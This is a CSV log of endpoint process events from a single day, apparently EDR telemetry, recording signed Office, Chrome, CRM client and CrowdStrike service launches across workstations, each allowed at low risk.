event_id,timestamp,asset_id,user_id,parent_process,process_name,command_line,sha256,signature_status,edr_action,risk_level
P00525,2026-09-13 12:42:51,WKST-CMP-009,kndjavera,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",d79db82524710f07a116b0c081256fbf0fcb57ecde2104a8b3807be1a513b57f,signed,ALLOWED,Low
P00526,2026-09-13 12:44:12,WKST-CS-017,mhaingura,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",0b1279639274e86dec71e6e9ee8b650051e8f634d1d4d8f96adbbe6bfcdc0b5f,signed,ALLOWED,Low
P00527,2026-09-13 12:58:37,WKST-SWK-012,nambala,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",a5ceb3487140a0ff31fc53c6afebe615890cb71691af379ef9e626f501b5c4f8,signed,ALLOWED,Low
P00528,2026-09-13 12:59:53,WKST-SWK-002,nduminga,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",27f689619b3cbeb7cdb409dcf4f9292414fb431610e9c1bbfe611c4979846a31,signed,ALLOWED,Low
P00529,2026-09-13 13:16:56,WKST-HR-014,mukwambi,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",99f289ad520b289125628d923e300cca3b1f7645a85cd8563abd4d52d9f61758,signed,ALLOWED,Low
P00530,2026-09-13 13:17:33,WKST-FIN-021,jkavari,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",eb6a7555bb75efd6335744e4365c01e954c73f824e06338c83824b989bca7017,signed,ALLOWED,Low
P00531,2026-09-13 13:28:52,WKST-FIN-004,tshivute,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,fc28e0b56cf9fa699039fa2bd283e793fda51eca662e27aa8c512fd69c1667ee,signed,ALLOWED,Low
P00532,2026-09-13 13:49:58,WKST-HR-002,pnakale,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",e6b6253513dc0fa3551697f968c44d667afe34bba965dfdba81ec17e25381060,signed,ALLOWED,Low
P00533,2026-09-13 14:02:45,WKST-SOC-003,haufiku,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",50dd55b181dfaa0ca73c3e0537b787483089c5dc580ef687919db0e7a12be4cf,signed,ALLOWED,Low
P00534,2026-09-13 14:09:04,WKST-EXE-002,shapaka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",d853ae889e32e8c5b051f947eaefb093e9a901e4620bc5848c999ee3ba7e884d,signed,ALLOWED,Low
P00535,2026-09-13 14:12:09,WKST-SWK-012,nambala,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",4a5c112256c240c5cd90721f86eecc5037d72b59bc2786809bbbe19ce955cd4a,signed,ALLOWED,Low
P00536,2026-09-13 14:18:06,WKST-AUD-004,tjirera,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,77774dd4f15e23315dc60451d05cc826fbed3a05779f79e3ad2b24659cf7d9dc,signed,ALLOWED,Low
P00537,2026-09-13 14:41:10,WKST-IT-012,katjiuongua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",7fad5f91b034f4cb86ae6e661889c09d44ba52ebd944ea0a353738648fe52e41,signed,ALLOWED,Low
P00538,2026-09-13 14:41:26,WKST-CS-011,tkamati,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,b88ef6f599dd2f5e577e1d1af1541a4f99eb091a6a83db4abcdf6adbb650502e,signed,ALLOWED,Low
P00539,2026-09-13 14:49:45,WKST-RSK-006,murorua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",ce88c003bf5e999ff39c92425b24eedbf8b3f26f14b4df8f7ea854b8e9363002,signed,ALLOWED,Low
P00540,2026-09-13 14:52:20,WKST-OND-004,ndjaba,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",1655d3e561e2b21ee1a52b04ef59a1542d62465042b16e80d164349c222cfa00,signed,ALLOWED,Low
P00541,2026-09-13 14:54:58,WKST-CS-017,mhaingura,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,b8d31d8ab5dd4ffab5ee94a7ce608d49ee50cf5b306e532e16fc8d02d7e70d75,signed,ALLOWED,Low
P00542,2026-09-13 14:57:59,WKST-CS-011,tkamati,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",77ba5401a358f69ca1ea457053d4a456b22c1a6c76be568085edcc4cd923cc3c,signed,ALLOWED,Low
P00543,2026-09-13 15:02:10,WKST-FIN-021,jkavari,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",c05f5eb5df29d486595ff8ff7d5963715867530d0d2c8c67f851dae2bd364a74,signed,ALLOWED,Low
P00544,2026-09-13 15:02:24,WKST-FIN-004,tshivute,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,91f027c537c8e548c0faa7236ad79cd80c98d4f0292dd9d72e7374b502413961,signed,ALLOWED,Low
P00545,2026-09-13 15:04:26,WKST-LOAN-018,shilongo,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",c4969515ea48c1ff390d952a3a6cf5b9f508144a95841dc8f3570f2150aa4253,signed,ALLOWED,Low
P00546,2026-09-13 15:32:24,WKST-MKT-010,ntinda,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",ffe8f257456aef62dff5e787bbb5d2b2c11d803b6ba78848b0702d86ee21dde3,signed,ALLOWED,Low
P00547,2026-09-13 15:33:23,WKST-RSK-006,murorua,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",4b187134376afcfd628a5be38e336fec8b935fd9dd1fef2d27ee537150b49597,signed,ALLOWED,Low
P00548,2026-09-13 15:35:54,WKST-SWK-008,sihuhua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",b8f2ee0f99ac959f5bed8248c6eb0aff97b3d9db7211e393a1782839cb5adf42,signed,ALLOWED,Low
P00549,2026-09-13 15:37:17,WKST-SWK-012,nambala,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",3690f91ca318084fd2e3c99fb11b43162cd1d266e3dd581bb797755d7b45f3ff,signed,ALLOWED,Low
P00550,2026-09-13 15:39:12,WKST-TRY-007,hamukwaya,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",3ba4d5565020f75f7348115611bca20d49d3afb4995c4c41025947d999bca376,signed,ALLOWED,Low
P00551,2026-09-13 16:07:42,WKST-IT-005,nghifindaka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",196b73f485646e71bce81cd4acb9e4d2a6b61b877e143257eba4a477beaf8832,signed,ALLOWED,Low
P00552,2026-09-13 16:08:33,WKST-IT-012,katjiuongua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",38a8c238743c638b619f082ea2d5a993db5a1865cf11317ea529607847411010,signed,ALLOWED,Low
P00553,2026-09-13 16:29:25,WKST-CMP-003,amupanda,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",3c6c43b3e1d28313078dfeddc0d887b68784a9b1e5587782390d40b3422a2bd7,signed,ALLOWED,Low
P00554,2026-09-13 16:42:18,WKST-IT-005,nghifindaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",905b0d120be47614354c3fef7016ef7e84f08a6b6910c27ba762849a3e4a141e,signed,ALLOWED,Low
P00555,2026-09-13 17:32:28,WKST-EXE-002,shapaka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,57a91b3aba5ae174789e23bb274d8dde8089b6a6953c832ce3bf496f6acb9763,signed,ALLOWED,Low
P00556,2026-09-13 17:58:30,WKST-LOAN-018,shilongo,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",786af505af672426ac389c2af008f3cd2e532cc2734e2c4b0f4a714597292cfd,signed,ALLOWED,Low
P00557,2026-09-13 18:24:52,WKST-SWK-012,nambala,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,68ee66f2cc9938918e8268d0147b03a8b5645b57b3cfb22d21d810a4635f5482,signed,ALLOWED,Low
P00558,2026-09-13 18:28:08,WKST-CMP-003,amupanda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",8fdd9c15d15b2b17a2dd76d2f348fb8401d65139ffcbe80d5ffc9d93b99b31f4,signed,ALLOWED,Low
P00559,2026-09-13 18:30:37,WKST-FIN-004,tshivute,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",ea5893ce90ee825c9640ec4ae4965751fe58c95f61bb4cce9b2ef98ba34b905c,signed,ALLOWED,Low
P00560,2026-09-13 18:39:30,WKST-HR-014,mukwambi,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",9dc494c62cb0c07f28384da45774c99dc406343ed755fe160cdf8a06e5f471e3,signed,ALLOWED,Low
P00561,2026-09-13 18:45:30,WKST-SWK-008,sihuhua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",8974deea55b15d7ae5a333a6503045b7d3fed09ed144b55fd74ebbac1048e072,signed,ALLOWED,Low
P00562,2026-09-13 18:49:02,WKST-CS-011,tkamati,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,6af9e050125d093ee1f9df135d178c5eed5dc788d5e8b26611ce5359c3c8969c,signed,ALLOWED,Low
P00563,2026-09-13 19:09:15,WKST-LGL-005,mbandeka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",667c5c985bb2e6982c4f0d8fe53791b0fc7b91595b97d27e14098aaeb5013424,signed,ALLOWED,Low
P00564,2026-09-13 19:16:29,WKST-PRC-008,sankwasa,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",f7e1f9c25482059771201ef8d0772e98497b9cabbde85b14cfb9781d1713eaf4,signed,ALLOWED,Low
P00565,2026-09-13 19:20:52,WKST-SOC-003,haufiku,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",19738cc9e8c397e3784fbfe0ba83df1affbe8319b558a124da9ffd806774b296,signed,ALLOWED,Low
P00566,2026-09-13 19:40:17,WKST-SWK-008,sihuhua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",4c937012cc53b81d03d87390cfb758cc242df73b81bcc9ab807f3d17f794b6e9,signed,ALLOWED,Low
P00567,2026-09-13 19:53:17,WKST-MKT-010,ntinda,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",b562e65b2453e7e22f7d5772a209e5e9f45b70a55bf660fcc215e75e43bcdfd9,signed,ALLOWED,Low
P00568,2026-09-13 19:56:04,WKST-HR-002,pnakale,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",33e155dabbc2b2545dca67719a9fcfbdff155fd47f8428d45a3826118e1a8b8b,signed,ALLOWED,Low
